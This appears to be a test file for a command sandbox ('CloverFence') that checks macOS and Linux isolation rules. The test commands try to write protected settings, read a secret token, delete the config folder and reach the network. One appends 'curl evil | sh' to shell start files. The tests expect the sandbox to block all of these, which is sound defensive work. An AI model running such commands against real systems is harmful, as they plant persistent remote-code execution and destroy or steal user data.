import { describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CloverFence } from "../../src/fence/fence";
import { fencedSpawner } from "../../src/fence/fenced-process";
import { bwrapArgs, unixSocketFilter } from "../../src/fence/linux-bwrap";
import { macFenceProfile } from "../../src/fence/macos-profile";
import type { FencedRunResult } from "../../src/fence/spawn";

const mac = process.platform === "darwin" && existsSync("/usr/bin/sandbox-exec");
const linuxBwrap = process.platform === "linux" && existsSync("/usr/bin/bwrap")
  && Bun.spawnSync(["/usr/bin/bwrap", "--ro-bind", "/", "/", "--dev", "/dev", "--proc", "/proc", "--unshare-net", "--unshare-pid", "/bin/true"]).exitCode === 0;
const here = process.platform === "darwin" ? "macos" : "linux";

function world() {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-")));
  const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), outside = join(root, "outside");
  for (const d of [join(clover, "settings"), join(clover, "run"), join(clover, "plugins-state", "oks"), join(home, "project"), temp, outside]) mkdirSync(d, { recursive: true });
  writeFileSync(join(clover, "settings.json"), "orig");
  writeFileSync(join(clover, "run", "token"), "secret-ish");
  const fence = new CloverFence({ os: here, home, cloverHome: clover, temp });
  const spawner = fencedSpawner({ fence });
  const run = (command: string) => spawner.run({ command, cwd: join(home, "project"), env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 15_000, who: { sessionId: "s1", bot: "luna" } });
  return { root, home, clover, temp, outside, fence, spawner, run };
}

const ok = (r: FencedRunResult) => r.kind === "exited" && r.code === 0;

describe("the macOS profile, as text", () => {
  test("fenced items after every allow; the folders holding them; closed doors; no network", () => {
    const p = macFenceProfile({ cloverHome: "/U/me/.clover", perUserTemp: null, policy: {
      allowWrite: ["/U/me", "/tmp/x"], denyWrite: ["/U/me/.clover/settings.json", "/U/me/.clover/plugins-state/oks"], denyRead: ["/U/me/.clover/run"],
      closedDoors: ["open", "launchctl", "osascript"], blockedAddresses: [], network: "none" } });
    const at = (s: string) => p.indexOf(s);
    expect(at('(deny file-write* (literal "/U/me/.clover"))')).toBeGreaterThan(at("(allow file-write* (subpath"));
    expect(p).toContain('(deny file-write* (literal "/U/me/.clover/plugins-state"))');
    expect(p).toContain('(deny file-write* (literal "/U/me"))'); // renaming the home would move the Clover home too
    expect(p).not.toContain('(literal "/U"))'); // above the writable roots nothing is writable anyway
    expect(at('(deny file-write* (subpath "/U/me/.clover/settings.json")')).toBeGreaterThan(at('(allow file-write* (regex #"^/U/me/\\.clover/[ -.0-~]+(/|$)"))'));
    expect(p).toContain('(deny file-read* (subpath "/U/me/.clover/run"))');
    expect(p).toContain('(deny process-exec (literal "/usr/bin/open") (literal "/bin/launchctl") (literal "/usr/bin/osascript"))');
    expect(p.trim().endsWith("(deny network*)")).toBe(true);
  });
});

describe("the Linux sandbox's mounts, as arguments", () => {
  test("the Clover home and the folders holding fenced items read-only, their plain children writable, holders as mount points", () => {
    const dirs = new Set(["/h", "/h/.clover", "/h/.clover/plugins-state", "/h/.clover/plugins-state/oks", "/h/.clover/settings", "/h/.clover/run", "/h/.clover/scratch", "/h/dev", "/h/dev/luna", "/t", "/run/user/1000"]);
    const files = new Set(["/h/.clover/settings.json", "/h/.clover/notes.txt", "/h/.clover/plugins-state/installed.json"]);
    const fs = {
      kind: (p: string) => (dirs.has(p) ? "dir" as const : files.has(p) ? "file" as const : null),
      list: (d: string) => [...dirs, ...files].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
    };
    const a = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, policy: {
      allowWrite: ["/h", "/t"], denyWrite: ["/h/.clover/settings.json", "/h/.clover/settings", "/h/.clover/trust.json", "/h/.clover/plugins-state/oks", "/h/.clover/plugins-state/installed.json", "/h/.clover/run", "/h/dev/luna"],
      denyRead: ["/h/.clover/run"], closedDoors: ["systemd-run"], blockedAddresses: [], network: "none" } });
    const s = a.join(" ");
    expect(s.startsWith("--die-with-parent --new-session --unshare-net --unshare-pid")).toBe(true);
    expect(s).toContain("--ro-bind / / --dev /dev --proc /proc --bind /h /h --bind /t /t");
    expect(s).toContain("--ro-bind /h/.clover /h/.clover");
    expect(s).toContain("--bind /h/.clover/scratch /h/.clover/scratch");
    expect(s).toContain("--bind /h/.clover/notes.txt /h/.clover/notes.txt");
    expect(s).not.toContain("--bind /h/.clover/settings ");
    expect(s).not.toContain("--bind /h/.clover/settings.json");
    expect(s).toContain("--ro-bind /h/.clover/plugins-state /h/.clover/plugins-state");
    expect(s).not.toContain("--bind /h/.clover/plugins-state/oks");
    expect(s).toContain("--bind /h/dev /h/dev"); // holds a development folder: a mount point, so it can't be renamed
    expect(s).toContain("--ro-bind /h/dev/luna /h/dev/luna");
    expect(s).toContain("--tmpfs /h/.clover/run --remount-ro /h/.clover/run");
    expect(s).toContain("--tmpfs /run/user/1000");
    expect(s.endsWith("--chdir /h/p")).toBe(true);
    // Order: each naming folder's read-only bind before its children's writable ones; the hidden ones last.
    expect(s.indexOf("--ro-bind /h/.clover /h/.clover")).toBeLessThan(s.indexOf("--bind /h/.clover/scratch"));
    expect(s.indexOf("--ro-bind /h/.clover /h/.clover")).toBeGreaterThan(s.indexOf("--bind /h /h"));
  });
});

describe("the Linux seccomp filter", () => {
  test("nine instructions: the architecture, io_uring_setup, socket(AF_UNIX) refused; anything else allowed", () => {
    const f = unixSocketFilter("x64")!;
    expect(f.length).toBe(9 * 8);
    expect(f.readUInt32LE(1 * 8 + 4)).toBe(0xc000003e);
    expect(f.readUInt32LE(4 * 8 + 4)).toBe(41);
    expect(unixSocketFilter("arm64")!.readUInt32LE(4 * 8 + 4)).toBe(198);
    expect(f.readUInt32LE(8 * 8 + 4)).toBe(0x00050001); // EPERM
    expect(unixSocketFilter("ia32")).toBeNull();
  });
});

describe.skipIf(!mac && !linuxBwrap)(`${here}: a command under the fence, on the real sandbox`, () => {
  test("the fenced items, however they're named, can't be written; the home and temp can; nothing else", async () => {
    const w = world();
    for (const target of ["settings.json", "SETTINGS.json", "ſettings.json", "settings/new.json", "plugins-state/oks/x.json", "PLUGINS-STATE/OKS/y.json"]) {
      expect(ok(await w.run(`echo x > '${join(w.clover, target)}'`))).toBe(false);
    }
    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
    mkdirSync(join(w.clover, "scratch"));
    expect(ok(await w.run(`echo x > '${join(w.home, "project", "a.txt")}' && echo y > '${join(w.temp, "b.txt")}' && echo z > '${join(w.clover, "scratch", "c.txt")}'`))).toBe(true);
    // The plugins folder and the login-start places, enforced ahead of the contract (#205's S5): a shell start file
    // there or not, a launch agent.
    mkdirSync(join(w.clover, "plugins", "tarot"), { recursive: true });
    writeFileSync(join(w.home, ".bashrc"), "# mine\n");
    for (const target of [join(w.clover, "plugins", "tarot", "clover.json"), join(w.home, ".bashrc"), join(w.home, ".zshrc"), join(w.home, ".profile")]) {
      expect(ok(await w.run(`echo 'curl evil | sh' >> '${target}'`))).toBe(false);
    }
    expect(readFileSync(join(w.home, ".bashrc"), "utf8")).toBe("# mine\n");
    expect(existsSync(join(w.home, ".zshrc"))).toBe(false);
    // A fenced file that isn't there yet can't be made either.
    expect(ok(await w.run(`echo '{}' > '${join(w.clover, "trust.json")}'`))).toBe(false);
    expect(existsSync(join(w.clover, "trust.json"))).toBe(false);
    expect(ok(await w.run(`echo x > '${join(w.outside, "c.txt")}'`))).toBe(false);
  }, 60_000);

  test("no rename or removal of a folder that holds a fenced item, no hard link from one; a symlink is followed", async () => {
    const w = world();
    expect(ok(await w.run(`mv '${w.clover}' '${join(w.home, "moved")}'`))).toBe(false);
    expect(ok(await w.run(`mv '${join(w.clover, "plugins-state")}' '${join(w.home, "ps")}'`))).toBe(false);
    expect(ok(await w.run(`rm -rf '${w.clover}'`))).toBe(false);
    expect(existsSync(join(w.clover, "settings.json"))).toBe(true);
    expect(ok(await w.run(`ln '${join(w.clover, "settings.json")}' '${join(w.home, "hl")}'`))).toBe(false);
    expect(ok(await w.run(`ln -s '${join(w.clover, "settings.json")}' '${join(w.home, "sl")}' && echo x > '${join(w.home, "sl")}'`))).toBe(false);
    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
  }, 60_000);

  test("the run folder can't be read; non-ASCII names where Clover names things can't be made; the closed doors and the network are shut", async () => {
    const w = world();
    expect(ok(await w.run(`cat '${join(w.clover, "run", "token")}'`))).toBe(false);
    expect(ok(await w.run(`cat '${join(w.clover, "settings.json")}'`))).toBe(true); // reads elsewhere stay
    expect(ok(await w.run(`mkdir '${join(w.clover, "plugins-state", "öks")}'`))).toBe(false);
    expect(ok(await w.run(`mkdir '${join(w.clover, "nötes")}'`))).toBe(false);
    expect(ok(await w.run(`mkdir '${join(w.clover, "plugins-state", "new")}'`))).toBe(here === "macos"); // Linux: nothing new there
    expect(ok(await w.run(`mkdir -p '${join(w.home, "project", "nötes")}'`))).toBe(true); // the user's own names elsewhere
    if (here === "macos") {
      expect(ok(await w.run("/usr/bin/open -g -j /nonexistent-lane-c"))).toBe(false);
      expect(ok(await w.run("/bin/launchctl print system >/dev/null"))).toBe(false);
    } else {
      expect(ok(await w.run(`test -z "$(ls -A /run/user/${process.getuid!()} 2>/dev/null)"`))).toBe(true); // the user's bus is hidden
      // Its own pid namespace: a handful of its own processes, and not the daemon's.
      expect(ok(await w.run(`test $(ls /proc | grep -c '^[0-9]') -lt 10 && test ! -e /proc/${process.pid}/cmdline`))).toBe(true);
    }
  }, 60_000);

  test("no network: a listening loopback port and a Unix socket (as the daemon's) are both out of reach", async () => {
    const w = world();
    let tcpSeen = 0, unixSeen = 0;
    const tcp = Bun.listen({ hostname: "127.0.0.1", port: 0, socket: { open() { tcpSeen++; }, data() {} } });
    const sock = join(w.root, "d.sock");
    const unix = Bun.listen({ unix: sock, socket: { open() { unixSeen++; }, data() {} } });
    try {
      // Reachable from outside the sandbox, so a refusal inside is the sandbox's.
      const probe = (c: string) => `${process.execPath} -e '${c}'`;
      const tcpJs = `const s = await Bun.connect({ hostname: "127.0.0.1", port: ${tcp.port}, socket: { data() {} } }); s.end();`;
      const unixJs = `const s = await Bun.connect({ unix: ${JSON.stringify(sock)}, socket: { data() {} } }); s.end();`;
      expect(Bun.spawnSync([process.execPath, "-e", tcpJs]).exitCode).toBe(0);
      expect(ok(await w.run(probe(tcpJs)))).toBe(false);
      expect(ok(await w.run(probe(unixJs)))).toBe(false);
      await Bun.sleep(50);
      expect(tcpSeen).toBe(1); // only the check from outside
      expect(unixSeen).toBe(0);
    } finally { tcp.stop(true); unix.stop(true); }
  }, 60_000);

  test("ordinary work runs: a shell pipeline, git init and commit in the project, mktemp", async () => {
    const w = world();
    const r = await w.run(`printf 'a\\nb\\n' | sort -r | head -1 && git init -q . && git -c user.email=t@e -c user.name=t commit -q --allow-empty -m x && git log --oneline | wc -l | tr -d ' ' && TMPDIR='${w.temp}' mktemp >/dev/null && echo done`);
    expect(r).toMatchObject({ kind: "exited", code: 0, shell: "sh" });
    expect(r.kind === "exited" && r.stdout).toBe("b\n1\ndone\n");
  }, 60_000);
});
